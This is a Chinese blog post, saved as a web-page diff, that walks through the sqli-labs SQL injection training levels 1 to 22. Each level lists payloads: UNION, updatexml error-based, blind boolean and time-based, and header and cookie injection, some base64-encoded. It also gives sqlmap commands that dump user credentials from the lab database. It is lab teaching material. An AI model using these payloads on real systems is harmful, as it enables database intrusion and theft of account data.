@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    sqli-labs(1~22) |  の
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="の" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-sqli-labs(1_22)"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  sqli-labs(1~22)
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/03/07/sqli-labs(1_22)/" class="article-date">
+  <time datetime="2019-03-06T16:00:00.000Z" itemprop="datePublished">2019-03-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.7k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">11 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p><a target="_blank" rel="noopener" href="http://43.247.91.228:84/">sqli-labs网址链接</a></p>
+<a id="more"></a>
+<h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><strong>方法一：</strong><br>输入?id=1正常显示，输入?id=1’报错，输入?id=1’ and 1=’1，正常显示，得知是字符型注入，<br>爆字段： <code>?id=1&#39; order by 3--+</code><br>查看回显内容：<code>?id=-1‘ union select 1,2,3--+</code><br>爆库名，版本号：<code>？id=-1&#39; union select 1,database(),version()</code><br>爆所有数据库：<code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23</code><br>爆表名：<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23</code><br>爆列名：<code>?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code><br>爆数据：<code>?id=-1&#39; union select 1,2,group_concat(id,username,password) from users%23</code></p>
+<p><strong>方法二：</strong><br>借助sqlmap软件直接爆破<br>最终payload：<code>./sqlmap.py -u &quot;http://43.247.91.228:84/Less-1/?id=1&quot;  -D security -T users --dump</code><br>得到的数据结果如下：<br><img src="https://s2.ax1x.com/2019/02/27/kTWpG9.png" alt="获取数据"></p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>输入1’，根据报错信息确定输入的内容被原封不动的带入到数据库中，输入?id=1 and 1=1,显示正常，得知是数字型注入，将单引号去掉，其他方法步骤和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1 union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>单引号报错，输入1’，根据报错信息发现输入的内容后有’)，想到应该以 ‘) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘1’) …，在第一题中id=1的后面加上’）,其他步骤和方法和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1&#39;) union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>双引号报错，输入1’，显示正常，输入1’’,根据报错信息发现输入的内容后有”)，想到应该以 ‘’) 来闭合表达式，脑补一下输入1后的sql语言，形如select … from … where id=(‘’1’’) …，在第一题中id=1的后面加上’’）,其他步骤和方法和less-1一样，不再重复了。<br>直接上爆数据payload：<code>?id=-1&quot;) union select 1,2,group_concat(id,username,password) from users%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>输入之前的内容发现不再显示数据信息，应该是报错注入或者盲注。<br>输入?id=1’报错，根据sql语法错误提示，得知是字符型报错注入。<br>爆库名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23</code><br>爆表名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)%23</code><br>爆列名：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),0x7e),1)%23</code><br>爆数据：<code>?id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23</code><br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
+<h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>与第5关类似，只不过这一关使用的是” “的方式闭合字符串，我们只需要将?id=1’ 改为 ?id=1”,后面的参数不变，其余过程不再赘述，和less-5一样。<br>sqlmap同样可以直接爆破，payload后的参数和less-1一样。</p>
+<h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>输入<code>?id=1&#39;</code>报错，经几次测试后发现只有在后面添加 ‘ 会报错，但是这次后台对报错进行了处理，所有错误都显示语法错误。<br>我们利用单引号进行进一步注入：<code>?id=1&#39; and sleep(3)--+</code>还是报错，猜测是不是过滤了某些字符，<br>测试过滤字符：<code>?id=1&#39; and sleep(3) or 1=&#39;1</code>发现显示正常了，发现后台过滤了的注释字符,通过盲注一步步判断<br>判断数据库的第一个字符是s：<code>?id=1&#39; and ascii(substr((select database()),1,1))=115 and 1=&#39;1</code><br>显示正常，说明数据库的第一个字符的acsll值为115，即为s。<br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
+<h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>这一个和less-7差不多，把报错全部过滤了，如果错误就没有返回，正确就返回you are in……，而其注释符没有被过滤，我们就可以利用基于布尔的盲注进行测试：<br>判断数据库的第一个字符是s：<code>?id=1&#39; and ascii(substr((select database()),1,1))=115--+</code><br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
+<h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>无论输入什么都是返回相同的内容，报错注入无效了，尝试一下时间盲注：<br>判断是否有注入：<code>?id=1&#39; and sleep(3)--+</code>，停留了3s后刷新，说明存在注入点。<br>其他的和less-7差不多，只是在最后要加上<code>and sleep(3)--+</code>来判断对错。<br>判断数据库的第一个字符是s：<code>?id=1&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+</code><br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
+<h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>和less-9类似，只是闭合符号变成了 ‘’ ，<br>检查是否存在注入：<code>?id=1&#39;&#39; and sleep(3)--+</code>,停留了3s后刷新，说明存在注入点。其他的和less-9一样了，<br>判断数据库的第一个字符是s：<code>?id=1&#39;&#39; and ascii(substr((select database()),1,1))=115 and sleep(3)--+</code><br>一步步尝试，过程比较麻烦，使用脚本比较方便。<br>可直接sqlmap跑一下，payload后的参数和less-1一样。</p>
+<h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><strong>方法一：</strong><br>页面显示变了，不再是get方式传递参数，改为post方式传参，通过尝试发现闭合方式为 ‘ ,先使用万能钥匙登陆，登陆成功。<br><img src="https://s2.ax1x.com/2019/03/05/kjlLIx.png" alt="万能密码登陆"><br>查看是否有注入点，爆字段试试，<br><img src="https://s2.ax1x.com/2019/03/05/kj1ItP.png" alt="爆字段"><br>开始尝试<code>order by 3#</code>提示错误，最终确定<code>order by 2#</code>正常，接着判断回显内容，并爆数据库，<br><img src="https://s2.ax1x.com/2019/03/05/kj3etx.png" alt="爆数据库"><br>爆表名，<br><img src="https://s2.ax1x.com/2019/03/05/kj3zbd.png" alt="爆表名"><br>爆列名，<br><img src="https://s2.ax1x.com/2019/03/05/kjG3FI.png" alt="爆列名"><br>爆数据，<br><img src="https://s2.ax1x.com/2019/03/05/kjGwwj.png" alt="爆数据"><br><strong>方法二：</strong><br>还可以借助sqlmap软件直接爆破<br>最终payload：<code>./sqlmap.py -u &quot;http://localhost/sqli-labs/Less-11/&quot; --data=&quot;uname=*&amp;passwd=*&quot; -D security -T users --dump</code></p>
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>根据题目提示闭合方式应该为 “) ，输入万能钥匙，果然登陆成功，<br><img src="https://s2.ax1x.com/2019/03/06/kvJIw4.png" alt="万能钥匙登陆"><br>其他的和less-11一样，只是闭合方式变成了”)，其他的就不赘述了。下面直接上爆数据的截图，<br><img src="https://s2.ax1x.com/2019/03/06/kvYMhn.png" alt="爆数据"><br>也可直接sqlmap跑一下，payload后的参数和less-11一样。</p>
+<h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p>根据提示闭合方式应该是 ‘) ，但是利用万能钥匙成功登陆后并不显示有用信息，尝试报错注入，竟然成功了。<br><img src="https://s2.ax1x.com/2019/03/06/kvdEdO.png" alt="爆数据库"><br>接着爆表名：<br><img src="https://s2.ax1x.com/2019/03/06/kvdQyt.png" alt="爆表名"><br>接着爆列名：<br><img src="https://s2.ax1x.com/2019/03/06/kvdlOP.png" alt="爆表名"><br>最后爆数据：<br><img src="https://s2.ax1x.com/2019/03/06/kvdDmV.png" alt="爆数据"><br>也可直接sqlmap跑一下，payload后的参数和less-11一样。</p>
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>通过尝试发现闭合方式为 “ ，其他方法和less-13一样，不再赘述，下面直接上爆数据的截图，<br><img src="https://s2.ax1x.com/2019/03/06/kvwMh4.png" alt="爆数据"><br>也可直接sqlmap跑一下，payload后的参数和less-11一样。</p>
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>根据提示闭合方式为 ‘ ，但无论输入什么，都不再输出任何信息，只能尝试盲注，判断库名的第一个字符是否为s:<br><img src="https://s2.ax1x.com/2019/03/06/kvBFLq.png" alt="判断库名的第一个字符是s"><br>返回登陆成功，说明库名的第一个字符为s，反之则返回登陆失败。<br>接着要一步步尝试，过程比较麻烦，使用脚本比较方便。</p>
+<h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>通过尝试发现闭合方式为 “)，其他和less-15一样，只不过改变了闭合方式，直接上判断库名第一个字符是否为s的截图<br><img src="https://s2.ax1x.com/2019/03/06/kvBlO1.png" alt="判断库名的第一个字符为s"><br>返回登陆成功，说明说明库名的第一个字符为s，反之则返回登陆失败。接着要一步步尝试，过程比较麻烦，使用脚本比较方便。</p>
+<h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>利用万能钥匙登陆，竟然被嘲讽了。发现页面显示重置密码，sql语句应该类似于<code>update table set password=&#39;xxx&#39; where username = &#39;xxx&#39;</code>,需要我们先知道一个username，前几关爆数据的时候username里都有Dumb,我们输入username为Dumb，密码为123456后提示密码更改成功，然后进一步尝试，利用用户名为Dumb在密码处进行注入，<br>在密码栏里写入：<code>1&#39; order by 3#</code> ，报错了。试一下报错注入，<br>在密码栏里输入：<code>1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，成果爆出库名，<br>爆表名：密码栏输入<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e),1)#</code>,<br>爆列名：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;),0x7e),1)#</code>。</p>
+<p>sqlmap也可以跑出来数据库和表，参数的payload：<code>--data=&quot;uname=admin&amp;passwd=*&quot; -D security -T tables --dump</code>。</p>
+<h2 id="less-18"><a href="#less-18" class="headerlink" title="less-18"></a>less-18</h2><p>根据提示应该是UA注入，查看源代码，发现输入内容都有审查函数，不存在注入，先试一下UA注入。<br>根据前几关知道有一组数据为admin-admin，所以在username和password处都输入admin，成功登陆，看到提示信息，然后bp抓包后把User-Agent后的内容改为 1’ 运行，报错，说明存在注入，而且源代码里发现很重要的一条语句 **INSERT INTO table_name (‘uagent’,’ip_address’,’username’) VALUES (‘$uagent’,’$IP’,’$uname’)**，需要构造注入语句，还要满足闭合条件,<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQFB9.png" alt="修改User-Agent"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-19"><a href="#less-19" class="headerlink" title="less-19"></a>less-19</h2><p>与less-18类似，根据提示是Referer注入，成功登陆后bp抓包，修改Referer内容。<br>爆库名：<code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxQg3T.png" alt="修改Referer"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-20"><a href="#less-20" class="headerlink" title="less-20"></a>less-20</h2><p>与less-19类似，根据提示是Cookie注入，成功登陆后bp抓包，修改Cookie内容。<br>爆库名：<code> uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br><img src="https://s2.ax1x.com/2019/03/07/kxNiuV.png" alt="修改Cookie"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>按less-20的方法成功登陆后，发现页面和less-20有一些不同，<br><img src="https://s2.ax1x.com/2019/03/07/kxN4bT.png" alt="base64编码"><br>uname后的数据加密了，看到加密末尾的 = ，猜测应该是base64编码，到网上将admin进行base64加密，加密结果果然一样。<br>需要把注入字段进行base64加密，其他方法和less-20一样。<br>爆库注入字段：<code> uname=&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&#39;1</code><br>注入字段base64编码：<code>uname=JyBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9JzE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxNq2R.png" alt="修改Cookie，并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>和less-21类似，根据题目提示闭合方式是 “ ，其他方法和less-21一样。<br>爆库注入字段：<code> uname=&quot; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or 1=&quot;1</code><br>注入字段base64编码：<code>uname=IiBvciB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpIG9yIDE9IjE=</code><br>成功登陆后修改Cookie内容，<br><img src="https://s2.ax1x.com/2019/03/07/kxUHw8.png" alt="修改Cookie并进行base64编码"><br>成功得到库名，其他步骤都类似了，不再赘述。</p>
+<p><strong><em>sqli-labs(1~22)关卡全部完成了，如有错误，欢迎在评论中指出!</em></strong></p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          Donate
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3aO3LDMAwFQN//0k7rIpIeANkzIpeVJ3EkLgsEH75e8Xp/rOo3j/6q+vMbFgYGxmMZ79NVZZxv6+g5R+xkbxgYGPswkteff042UQ3QhaCMgYGBEQfEu4IsBgYGxl2MPBGsHgoGBgZGr4i9qw13XiR/vRbHwMB4IKPXMvvN56/MNzAwMB7FeBdXHkAnI4fyrjAwMJZm5AEu2eikSVdN+zAwMPZk9EaMefDNS9/zEcJr8lAMDIzHMqrbnQ8y8wtn1bEoBgbGqowkactHlYWTi1PPcoaLgYGxKKP64l45OmnwnQduDAyMVRm/Se/mw8uL52NgYCzNuIjEg6sY+aH0UsN/fouBgbE0YxIQJ9cpJgPUi64hBgbGQowk7atetsjPLw/No34hBgbGEoxJ26vXequmoeXyFQMDYzlGNRWrDhqr30zecpgaYmBgLMfoNc56aV+eSlbHDBgYGDswqgXk5FJXPhzNwRgYGDsw7rqw1bv/UG2xRUkhBgbGcoxe0TjB5Elk4R8ABgbGBow8UCblZXJFY97hL08qMDAwFmL0WvyTltwNiSYGBsaijF7hOk8ik7K2kIxiYGAszchXr/jMRwj58KAXrDEwMJ7O6AXZXslaDceF88bAwNiAUR0u5mXqvWnfRZ6LgYGBUQyjeSMvL3QxMDAweow8RPYSwaR4xsDA2IHRG0Dmr6yG1+SiGAYGxj6MXulYvXKajxZ6owIMDIxFGX+0jCLgfEStxAAAAABJRU5ErkJggg==" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2019/03/08/xss(1~10)/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            xss(1~10)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/02/20/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4--%E4%B8%8A%E4%BC%A0%E5%85%B3/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">网络安全实验室--上传关</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "ds54farWshFsUraKxWRVVf4G-gzGzoHsz",
+    app_key: "q4rgias5HDeq09ugweytekJQ",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2018-2023
+        <i class="ri-heart-fill heart_icon"></i> Supervampire
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="https://beian.miit.gov.cn/#/Integrated/recordQuery" target="_black" rel="nofollow">苏ICP备2022035104号-1</a>
+        </li>
+        
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/ayer-side.svg" alt="の"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://wxt123.top/downloads/">云盘</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222926.png">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210117222736.png">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
